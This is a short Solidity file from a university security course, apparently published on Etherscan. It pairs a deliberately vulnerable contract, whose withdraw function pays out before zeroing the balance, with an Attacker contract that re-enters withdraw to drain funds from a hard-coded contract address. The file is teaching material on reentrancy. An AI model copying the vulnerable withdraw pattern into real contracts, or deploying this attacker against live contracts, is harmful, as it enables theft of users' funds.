/**
 *Submitted for verification at Etherscan.io on 2021-12-08
*/

pragma solidity ^0.6.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL

contract Vuln {
    
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
       
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
    
}

contract Attacker {
  Vuln v= Vuln(0x36A540E3A78084962B75E25877CfACf8846Be018);
  address payable owner=msg.sender;
  uint i =0;
  uint x =0;

  
  receive  () external payable {
    if(x ==0){
      x+=1;
      v.deposit{value:.1 ether}();
      v.withdraw();
    }
    else if(i <=2){
      i += 1;
      v.withdraw();
    }
    i = 0;
    x =0;
  }

  
}